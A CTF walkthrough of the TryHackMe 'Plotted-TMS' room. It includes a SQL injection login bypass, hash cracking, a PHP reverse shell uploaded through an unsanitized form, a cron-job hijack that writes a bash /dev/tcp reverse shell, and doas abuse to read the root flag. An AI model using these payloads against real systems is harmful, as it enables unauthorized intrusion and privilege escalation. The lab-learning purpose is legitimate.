# Try Hack Me - Plotted-TMS
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points: 60
# Vulnerabilities: SQL injection, Lack of Sanitization in file upload, CronJob abuse, PrivEsc via doas SUID

# Reconnaisance:

nmap scan:

```bash
nmap -sC -sV <target_ip>
```
PORT    STATE SERVICE VERSION

22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)

80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)

445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


lets start with enumerating the http webserver at port 80 by fuzzing the directories using gobuster:

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```

/admin                (Status: 301) [Size: 312] [--> http://10.82.186.90/admin/]                                                                    

/index.html           (Status: 200) [Size: 10918]

/passwd               (Status: 200) [Size: 25]

/server-status        (Status: 403) [Size: 277]

/shadow               (Status: 200) [Size: 25]

lets access the /admin directory.

on accessing /admin we can see another directory named /id_rsa. on clicking on it we get a base 64 string 

VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE

lets use cyber chef to decode it. after decoding it we get to know that it is just a message from the creator of the room taunting us. lets keep on enumerating. even the /shadow had a similar message encoded in base64. 
instead of port 80 lets enumerate the port 445

```bash
gobuster dir -u http://<target_ip>:445 -w /usr/share/wordlists/dirb/common.txt 
```

/.hta                 (Status: 403) [Size: 278]

/.htpasswd            (Status: 403) [Size: 278]

/.htaccess            (Status: 403) [Size: 278]

/index.html           (Status: 200) [Size: 10918]

/management           (Status: 301) [Size: 322] [--> http://10.82.186.90:445/management/]                                                           

/server-status        (Status: 403) [Size: 278]

lets access the /management directory. on the main page there is a Traffic Offense Management System. there is also a login page at /management/admin/login.php
we bypass the login page using an SQL injection

# Bypassing the Login Page: 

enter this in the username field and type any random password in the password field
```bash
admin' OR '1'='1'-- -
```
now we run a gobuster scan on the /management directory

```bash
gobuster dir -u http://<target_ip>:445/management -w /usr/share/wordlists/dirb/common.txt
```

we get the results as
/.htaccess            (Status: 403) [Size: 278]

/.hta                 (Status: 403) [Size: 278]

/.htpasswd            (Status: 403) [Size: 278]

/admin                (Status: 301) [Size: 328] [--> http://10.82.186.90:445/management/admin/]                                                     

/assets               (Status: 301) [Size: 329] [--> http://10.82.186.90:445/management/assets/]                                                    

/build                (Status: 301) [Size: 328] [--> http://10.82.186.90:445/management/build/]                                                     

/classes              (Status: 301) [Size: 330] [--> http://10.82.186.90:445/management/classes/]                                                   

/database             (Status: 301) [Size: 331] [--> http://10.82.186.90:445/management/database/]                                                  

/dist                 (Status: 301) [Size: 327] [--> http://10.82.186.90:445/management/dist/]                                                      

/inc                  (Status: 301) [Size: 326] [--> http://10.82.186.90:445/management/inc/]                                                       

/index.php            (Status: 200) [Size: 14503]

/libs                 (Status: 301) [Size: 327] [--> http://10.82.186.90:445/management/libs/]                                                      

/pages                (Status: 301) [Size: 328] [--> http://10.82.186.90:445/management/pages/]                                                     

/plugins              (Status: 301) [Size: 330] [--> http://10.82.186.90:445/management/plugins/]                                                   

/uploads              (Status: 301) [Size: 330] [--> http://10.82.186.90:445/management/uploads/]                        

we access the /database and we find a mysql database dump with some user credentials

admin:0192023a7bbd73250516f069df18b500 
since we already have admin access thanks to the SQLi this credential is of no use

jsmith:1254737c076cf867dc53d60a0364f38e we use john the ripper to crack this md5 hash:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt jsmith_hash.txt
```

we get the password for jsmith

jsmith:jsmith123

maybe it could give us access to the ssh shell. negative status, we cannot access ssh using these credentials. lets enumerate further. 
we find a file upload vulnerability at the settings panel of the admin dashboard.

# Shell as www-user:

navigate to the settings (http://<target_ip>:445/management/admin/?page=system_info) and then in the background image upload, you can see it for yourself that there is no sanitization for the file extensions of the images we upload. which means we can upload a php revershell to it

we upload the reverse shell from our directory /usr/share/webshells/php/reverseshell/shell.php

now we navigate to the /management/uploads and access the shell.php which gets saved as 176369780_shell.php
before clicking on it we should set up a netcat listener in one terminal

```bash
nc -lnvp 4444
```

now we click on the shell.php at the /uploads directory and we trigger the reverse shell!
we have a shell as www-data

# Privilege Escalation (A):

since we are www-data we need to get a shell as the next higher privileged user on the system which is tms_user
after doing some enumeration on the system, we find an interesting file named initialize.php at /var/www/html/445

<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','/management/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"tms_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"Password@123");
if(!defined('DB_NAME')) define('DB_NAME',"tms_db");
?>

we get some crucial database credentials. after solving numerous ctfs, i have understood that there is no requirement for accessing the database and in most cases the password of the mysql server,
so now we have the password for user tms_user:Password@123


since the username does not match the one with a directory on this sytem, we cannot get a shell as plot_admin using this password, on accessing the database we can't find anything useful. we find a user admin who happens to have a password hash that even crackstation, john the ripper and hashcat could not crack. which means that is a dead end

let us run linpeas on the system to find any vulnerabilites in the system

if you do not know how to transfer linpeas to the target machine, just copy paste these commands on your attacker machine and target macine respectively

on your attacker machine:
```bash
cd /usr/share/peass/linpeas

#now start a python listener:
python3 -m http.server 8000
```

on your target machine:
```bash
cd /tmp

#use the wget command to get the linpeas.sh file
wget http://<attacker_ip>:8000/linpeas.sh

#give the file the required permissions
chmod +x linpeas.sh

#now run the file
./linpeas.sh
```

we find a cronjob running every minute at /var/www/scripts/backup.sh which is owned by plot_admin
lets find a way to exploit this script. 

* * * * *   plot_admin /var/www/scripts/backup.sh

since we do not have access to the backup.sh we cannot edit the file and append a revershell to it. so lets create a malicious file with the same name and path 

firstly lets create a backup of the orignal backup.sh , it is not necessary for getting a shell but it is considered as good practice.

```bash
mv backup.sh backup.sh.bkup
```
now lets create out own malicious backup.sh

```bash
cat > /var/www/scripts/backup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/target_ip/4445 0>&1
EOF
```
now we give the file the required permissions

```bash
chmod 777 backup.sh
```

after this we create a netcat listener at port 4445 (since 4444 is already occupied)

```bash
nc -lnvp 4445
```

after waiting for about a minute we finally get a shell as plot_admin

now the privilege escalation part is as easy as stealing candy from a kid

# Privilege Escalation (B):

from the linpeas scan we carried out earlier we found out that user plot_admin can run doas. basically doas is similar to sudo and can be used to perform commands via other users like root!

doas -u root /bin/bash this command does not work hence we use openssl

```bash
doas -u root openssl base64 -in /root/root.txt
```

yeehawww!!! we get a base64 encoded string which upon decoding using cyberchef, we get the root.txt flag with a message from the creator of this brilliant ctf. we submit the root.txt flag
